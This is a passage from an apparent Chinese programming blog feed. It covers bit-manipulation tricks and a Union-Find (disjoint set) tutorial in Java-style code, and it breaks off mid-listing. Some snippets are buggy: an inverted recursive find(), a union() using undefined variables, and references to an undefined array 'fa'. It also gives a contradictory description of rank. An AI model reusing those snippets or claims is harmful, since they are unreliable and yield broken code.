<span class="title">reversal</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整数取反加1，正好变成其对应的负数(补码表示)；负数取反加一，则变为其原码，即正数</p><p><strong>5. 位操作求绝对值</strong></p><ul><li>整数的绝对值是其本身，负数的绝对值正好可以对其进行取反加一求得，即我们首先判断其符号位（整数右移 31 位得到 0，负数右移 31 位得到 -1,即 0xffffffff），然后根据符号进行相应的操作</li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">abs</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123; </span><br><span class="line"><span class="keyword">int</span> i = a &gt;&gt; <span class="number">31</span>; </span><br><span class="line"><span class="keyword">return</span> i == <span class="number">0</span> ? a : (~a + <span class="number">1</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的操作可以进行优化，可以将 i == 0 的条件判断语句去掉。我们都知道符号位 i 只有两种情况，即 i = 0 为正，i = -1 为负。对于任何数与 0 异或都会保持不变，与 -1 即 0xffffffff 进行异或就相当于对此数进行取反,因此可以将上面三目元算符转换为((a^i)-i)，即整数时 a 与 0 异或得到本身，再减去 0，负数时与 0xffffffff 异或将 a 进行取反，然后在加上 1，即减去 i(i =-1)</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">abs2</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = a &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> ((a^i) - i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>6. 位操作进行高低位交换</strong></p><ul><li>给定一个 16 位的无符号整数，将其高 8 位与低 8 位进行交换，求出交换后的值，如：</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">34520</span>的二进制表示：</span><br><span class="line"><span class="number">10000110</span> <span class="number">11011000</span></span><br><span class="line"></span><br><span class="line">将其高<span class="number">8</span>位与低<span class="number">8</span>位进行交换，得到一个新的二进制数：</span><br><span class="line"><span class="number">11011000</span> <span class="number">10000110</span></span><br><span class="line">其十进制为<span class="number">55430</span></span><br></pre></td></tr></table></figure><p>从上面移位操作我们可以知道，只要将无符号数 a&gt;&gt;8 即可得到其高 8 位移到低 8 位，高位补 0；将 a&lt;<8 即可将 低 8 位移到高 8 位，低 8 位补 0，然后将 a>&gt;8 和 a&lt;&lt;8 进行或操作既可求得交换后的结果。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">unsigned short a</span> = 34520; </span><br><span class="line"><span class="attribute">a</span> = (a &gt;&gt; 8) | (a &lt;&lt; 8);</span><br></pre></td></tr></table></figure><p><strong>7. 位操作进行二进制逆序</strong></p><p>将无符号数的二进制表示进行逆序，求取逆序后的结果，如</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数<span class="number">34520</span>的二进制表示：</span><br><span class="line"><span class="number">10000110</span> <span class="number">11011000</span></span><br><span class="line"></span><br><span class="line">逆序后则为：</span><br><span class="line"><span class="number">00011011</span> <span class="number">01100001</span></span><br><span class="line">它的十进制为<span class="number">7009</span></span><br></pre></td></tr></table></figure><p>在字符串逆序过程中，可以从字符串的首尾开始，依次交换两端的数据。在二进制中使用位的高低位交换会更方便进行处理，这里我们分组进行多步处理。</p><ul><li>第一步:以每 2 位为一组，组内进行高低位交换</li></ul><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交换前：<span class="number"> 10 </span>00<span class="number"> 01 </span>10<span class="number"> 11 </span>01<span class="number"> 10 </span>00 </span><br><span class="line">交换后：<span class="number"> 01 </span>00<span class="number"> 10 </span>01<span class="number"> 11 </span>10<span class="number"> 01 </span>00</span><br></pre></td></tr></table></figure><ul><li>第二步：在上面的基础上，以每 4 位为 1 组，组内高低位进行交换</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">交换前：</span> <span class="number">0100 </span><span class="number">1001 </span><span class="number">1110 </span><span class="number">0100</span> </span><br><span class="line"><span class="string">交换后：</span> <span class="number">0001 </span><span class="number">0110 </span><span class="number">1011 </span><span class="number">0001</span></span><br></pre></td></tr></table></figure><ul><li>第三步：以每 8 位为一组，组内高低位进行交换</li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交换前： <span class="number">00010110</span> <span class="number">10110001</span> </span><br><span class="line">交换后： <span class="number">01100001</span> <span class="number">00011011</span></span><br></pre></td></tr></table></figure><ul><li>第四步：以每16位为一组，组内高低位进行交换</li></ul><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交换前：<span class="number"> 0110000100011011 </span></span><br><span class="line">交换后： 0001101101100001</span><br></pre></td></tr></table></figure><p>对于上面的第一步，依次以 2 位作为一组，再进行组内高低位交换，这样处理起来比较繁琐，下面介绍另外一种方法进行处理。先分别取原数 10000110 11011000 的奇数位和偶数位，将空余位用 0 填充：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原数： <span class="number">10000110</span> <span class="number">11011000</span></span><br><span class="line">奇数位： <span class="number">10000010</span> <span class="number">10001000</span></span><br><span class="line">偶数位： <span class="number">00000100</span> <span class="number">01010000</span></span><br></pre></td></tr></table></figure><p>再将奇数位右移一位，偶数位左移一位，此时将两个数据相或即可以达到奇偶位上数据交换的效果：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原数： <span class="number">10000110</span> <span class="number">11011000</span></span><br><span class="line">奇数位右移一位： <span class="number">0 10000010</span> <span class="number">1000100</span></span><br><span class="line">偶数位左移一位：<span class="number">0000100</span> <span class="number">01010000 0</span></span><br><span class="line">两数相或得到： <span class="number">01001001</span> <span class="number">11100100</span></span><br></pre></td></tr></table></figure><p>上面的方法用位操作可以表示为：</p><ul><li><p>取a的奇数位并用 0 进行填充可以表示为：a &amp; 0xAAAA</p></li><li><p>取a的偶数为并用 0 进行填充可以表示为：a &amp; 0x5555 因此，上面的第一步可以表示为： </p><p>a = ((a &amp; 0xAAAA) &gt;&gt; 1) | ((a &amp; 0x5555) &lt;&lt; 1) </p><p>同理，可以得到其第二、三和四步为：</p><p>a = ((a &amp; 0xCCCC) &gt;&gt; 2) | ((a &amp; 0x3333) &lt;&lt; 2) </p><p>a = ((a &amp; 0xF0F0) &gt;&gt; 4) | ((a &amp; 0x0F0F) &lt;&lt; 4) </p><p>a = ((a &amp; 0xFF00) &gt;&gt; 8) | ((a &amp; 0x00FF) &lt;&lt; 8) 因此整个操作为：</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned <span class="keyword">short</span> a = <span class="number">34520</span>;</span><br><span class="line"></span><br><span class="line">a = ((a &amp; <span class="number">0xAAAA</span>) &gt;&gt; <span class="number">1</span>) | ((a &amp; <span class="number">0x5555</span>) &lt;&lt; <span class="number">1</span>);</span><br><span class="line">a = ((a &amp; <span class="number">0xCCCC</span>) &gt;&gt; <span class="number">2</span>) | ((a &amp; <span class="number">0x3333</span>) &lt;&lt; <span class="number">2</span>);</span><br><span class="line">a = ((a &amp; <span class="number">0xF0F0</span>) &gt;&gt; <span class="number">4</span>) | ((a &amp; <span class="number">0x0F0F</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">a = ((a &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>) | ((a &amp; <span class="number">0x00FF</span>) &lt;&lt; <span class="number">8</span>);</span><br></pre></td></tr></table></figure><p><strong>8. 位操作统计二进制中 1 的个数</strong></p><p>统计二进制1的个数可以分别获取每个二进制位数，然后再统计其1的个数，此方法效率比较低。这里介绍另外一种高效的方法，同样以 34520 为例，我们计算其 a &amp;= (a-1)的结果：</p><ul><li>第一次：计算前：1000 0110 1101 1000 计算后：1000 0110 1101 0000</li><li>第二次：计算前：1000 0110 1101 0000 计算后：1000 0110 1100 0000</li><li>第二次：计算前：1000 0110 1100 0000 计算后：1000 0110 1000 0000 我们发现，没计算一次二进制中就少了一个 1，则我们可以通过下面方法去统计：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span>  </span><br><span class="line"><span class="keyword">while</span>(a)&#123;  </span><br><span class="line">a = a &amp; (a - <span class="number">1</span>);  </span><br><span class="line">count++;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">位运算的相关技巧</summary>
    
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://lishuaiyun.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="位运算" scheme="http://lishuaiyun.cn/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>设计</title>
    <link href="http://lishuaiyun.cn/2021/03/11/%E8%AE%BE%E8%AE%A1/"/>
    <id>http://lishuaiyun.cn/2021/03/11/%E8%AE%BE%E8%AE%A1/</id>
    <published>2021-03-11T11:52:53.000Z</published>
    <updated>2022-03-26T13:15:55.652Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-并查集"><a href="#1-并查集" class="headerlink" title="1. 并查集"></a>1. 并查集</h1><h2 id="1-1-并查集详解"><a href="#1-1-并查集详解" class="headerlink" title="1.1 并查集详解"></a>1.1 并查集详解</h2><p>Union-Find 算法，也就是常说的并查集算法，主要是解决图论中「动态连通性」问题。</p><p>开始参考的labuladong，发现平衡优化和路径压缩有问题，并查集参考：</p><p><a href="https://zhuanlan.zhihu.com/p/93647900">https://zhuanlan.zhihu.com/p/93647900</a></p><h3 id="1-1-1-问题介绍"><a href="#1-1-1-问题介绍" class="headerlink" title="1.1.1 问题介绍"></a>1.1.1 问题介绍</h3><p>简单说，动态连通性其实可以抽象成给一幅图连线。比如下面这幅图，总共有 10 个节点，他们互不相连，分别用 0~9 标记：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集1.jpg" alt="并查集1" style="zoom:50%;" /></p><p>现在我们的 Union-Find 算法主要需要实现这两个 API：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* 将 p 和 q 连接 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span></span>;</span><br><span class="line">    <span class="comment">/* 判断 p 和 q 是否连通 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span></span>;</span><br><span class="line">    <span class="comment">/* 返回图中有多少个连通分量 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里所说的「连通」是一种等价关系，也就是说具有如下三个性质：</p><p>1、自反性：节点<code>p</code>和<code>p</code>是连通的。</p><p>2、对称性：如果节点<code>p</code>和<code>q</code>连通，那么<code>q</code>和<code>p</code>也连通。</p><p>3、传递性：如果节点<code>p</code>和<code>q</code>连通，<code>q</code>和<code>r</code>连通，那么<code>p</code>和<code>r</code>也连通。</p><p>比如说之前那幅图，0～9 任意两个<strong>不同</strong>的点都不连通，调用<code>connected</code>都会返回 false，连通分量为 10 个。</p><p>如果现在调用<code>union(0, 1)</code>，那么 0 和 1 被连通，连通分量降为 9 个。</p><p>再调用<code>union(1, 2)</code>，这时 0,1,2 都被连通，调用<code>connected(0, 2)</code>也会返回 true，连通分量变为 8 个。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集2.jpg" alt="并查集2" style="zoom:50%;" /></p><p>判断这种「等价关系」非常实用，比如说编译器判断同一个变量的不同引用，比如社交网络中的朋友圈计算等等。</p><p>这样，你应该大概明白什么是动态连通性了，Union-Find 算法的关键就在于<code>union</code>和<code>connected</code>函数的效率。那么用什么模型来表示这幅图的连通状态呢？用什么数据结构来实现代码呢？</p><h3 id="1-1-2-基本思路"><a href="#1-1-2-基本思路" class="headerlink" title="1.1.2 基本思路"></a>1.1.2 基本思路</h3><p>注意我刚才把「模型」和具体的「数据结构」分开说，这么做是有原因的。因为我们使用森林（若干棵树）来表示图的动态连通性，用数组来具体实现这个森林。</p><p>怎么用森林来表示连通性呢？我们设定树的每个节点有一个指针指向其父节点，如果是根节点的话，这个指针指向自己。比如说刚才那幅 10 个节点的图，一开始的时候没有相互连通，就是这样：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集3.jpg" alt="并查集3" style="zoom:50%;" /></p><p><strong>初始化</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UF</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 记录连通分量</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line">    <span class="comment">// 节点 x 的节点是 parent[x]</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 构造函数，n 为图的节点总数 */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UF</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 一开始互不连通</span></span><br><span class="line">        <span class="keyword">this</span>.count = n;</span><br><span class="line">        <span class="comment">// 父节点指针初始指向自己</span></span><br><span class="line">        parent = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            parent[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 其他函数 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>如果某两个节点被连通，则让其中的（任意）一个节点的根节点接到另一个节点的根节点上</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集4.jpg" alt="并查集4" style="zoom:50%;" /></p><p><strong>查询</strong></p><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 返回某个节点 x 的根节点 */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 根节点的 parent[x] == x</span></span><br><span class="line">    <span class="keyword">if</span> (parent[x] != x)</span><br><span class="line">        x = parent[x];</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> find(parent[x]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>迭代：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 返回某个节点 x 的根节点 */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 根节点的 parent[x] == x</span></span><br><span class="line">    <span class="keyword">while</span> (parent[x] != x)</span><br><span class="line">        x = parent[x];</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合并：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 将两棵树合并为一棵</span></span><br><span class="line">    parent[rootP] = find(rootQ);</span><br><span class="line">    count--; <span class="comment">// 两个分量合二为一</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回当前的连通分量个数 */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这样，如果节点<code>p</code>和<code>q</code>连通的话，它们一定拥有相同的根节点</strong>：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集5.jpg" alt="并查集5" style="zoom:50%;" /></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">    <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">    <span class="keyword">return</span> rootP == rootQ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，Union-Find 算法就基本完成了。是不是很神奇？竟然可以这样使用数组来模拟出一个森林，如此巧妙的解决这个比较复杂的问题！</p><p>那么这个算法的复杂度是多少呢？我们发现，主要 API<code>connected</code>和<code>union</code>中的复杂度都是<code>find</code>函数造成的，所以说它们的复杂度和<code>find</code>一样。</p><p><code>find</code>主要功能就是从某个节点向上遍历到树根，其时间复杂度就是树的高度。我们可能习惯性地认为树的高度就是<code>logN</code>，但这并不一定。<code>logN</code>的高度只存在于平衡二叉树，对于一般的树可能出现极端不平衡的情况，使得「树」几乎退化成「链表」，树的高度最坏情况下可能变成<code>N</code>。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集6.jpg" alt="并查集6" style="zoom:50%;" /></p><p>所以说上面这种解法，<code>find</code>,<code>union</code>,<code>connected</code>的时间复杂度都是 O(N)。这个复杂度很不理想的，你想图论解决的都是诸如社交网络这样数据规模巨大的问题，对于<code>union</code>和<code>connected</code>的调用非常频繁，每次调用需要线性时间完全不可忍受。</p><p><strong>问题的关键在于，如何想办法避免树的不平衡呢</strong>？只需要略施小计即可。</p><h3 id="1-1-3-路径压缩"><a href="#1-1-3-路径压缩" class="headerlink" title="1.1.3 路径压缩"></a>1.1.3 路径压缩</h3><p>这步优化特别简单，所以非常巧妙。我们能不能进一步压缩每棵树的高度，使树高始终保持为常数？</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集8.jpg" alt="并查集8" style="zoom:50%;" /></p><p>这样<code>find</code>就能以 O(1) 的时间找到某一节点的根节点，相应的，<code>connected</code>和<code>union</code>复杂度都下降为 O(1)。</p><p>既然我们只关心一个元素对应的<strong>根节点</strong>，那我们希望每个元素到根节点的路径尽可能短，最好只需要一步,其实这说来也很好实现。只要我们在查询的过程中，<strong>把沿途的每个节点的父节点都设为根节点</strong>即可。</p><p>递归方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x == parent[x])</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        parent[x] = find(fa[x]);  <span class="comment">//父节点设为根节点</span></span><br><span class="line">        <span class="keyword">return</span> parent[x];         <span class="comment">//返回父节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简写为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x == parent[x] ? x : (parent[x] = find(fa[x]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-1-4-平衡性优化"><a href="#1-1-4-平衡性优化" class="headerlink" title="1.1.4 平衡性优化"></a>1.1.4 平衡性优化</h3><p>有些人可能有一个误解，以为路径压缩优化后，并查集始终都是一个<strong>菊花图</strong>（只有两层的树的俗称）。但其实，由于路径压缩只在查询时进行，也只压缩一条路径，所以并查集最终的结构仍然可能是比较复杂的。</p><p>我们要知道哪种情况下可能出现不平衡现象，关键在于<code>union</code>过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">    <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">    <span class="keyword">if</span> (rootP == rootQ)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 将两棵树合并为一棵</span></span><br><span class="line">    parent[rootP] = rootQ;</span><br><span class="line">    <span class="comment">// parent[rootQ] = rootP 也可以</span></span><br><span class="line">    count--;</span><br></pre></td></tr></table></figure><p>我们一开始就是简单粗暴的把<code>p</code>所在的树接到<code>q</code>所在的树的根节点下面，那么这里就可能出现「头重脚轻」的不平衡状况，比如下面这种局面：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/并查集7.jpg" alt="并查集7" style="zoom:50%;" /></p><p>长此以往，树可能生长得很不平衡。<strong>我们其实是希望，小一些的树接到大一些的树下面，这样就能避免头重脚轻，更平衡一些</strong>。</p><p>解决方法是我们用一个数组rank[]记录每个根节点对应的树的深度（如果不是根节点，其rank相当于以它作为根节点的<strong>子树</strong>的深度）。一开始，把所有元素的rank（<strong>秩</strong>）设为1。合并时比较两个根节点，把rank较小者往较大者上合并。路径压缩和按秩合并如果一起使用，时间复杂度接近 O(n)，但是很可能会破坏rank的准确性。</p><p>初始化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">inline <span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        parent[i] = i;</span><br><span class="line">        rank[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如说<code>rank[3] = 5</code>表示，以节点<code>3</code>为根的那棵树，总共有<code>5</code>个节点。这样我们可以修改一下<code>union</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">    <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">    <span class="keyword">if</span> (rootP == rootQ)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 小树接到大树下面，较平衡</span></span><br><span class="line">    <span class="keyword">if</span> (rank[rootP] &lt;= rank[rootQ]) &#123;</span><br><span class="line">        parent[rootP] = rootQ;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        parent[rootQ] = rootP;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (rank[rootP] == rank[rootQ] &amp;&amp; rootP != rootQ)</span><br><span class="line">        rank[rootQ]++;                   <span class="comment">//如果深度相同且根节点不同，则新的根节点的深度+1</span></span><br><span class="line">    count--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，通过比较树的重量，就可以保证树的生长相对平衡，树的高度大致在<code>logN</code>这个数量级，极大提升执行效率。</p><p>此时，<code>find</code>,<code>union</code>,<code>connected</code>的时间复杂度都下降为 O(logN)，即便数据规模上亿，所需时间也非常少。</p><p>PS：读者可能会问，这个 GIF 图的find过程完成之后，树高恰好等于 3 了，但是如果更高的树，压缩后高度依然会大于 3 呀？不能这么想。这个 GIF 的情景是我编出来方便大家理解路径压缩的，但是实际中，每次find都会进行路径压缩，所以树本来就不可能增长到这么高，你的这种担心应该是多余的。</p><h3 id="1-1-5-最后总结"><a href="#1-1-5-最后总结" class="headerlink" title="1.1.5 最后总结"></a>1.1.5 最后总结</h3><p>我们先来看一下完整代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 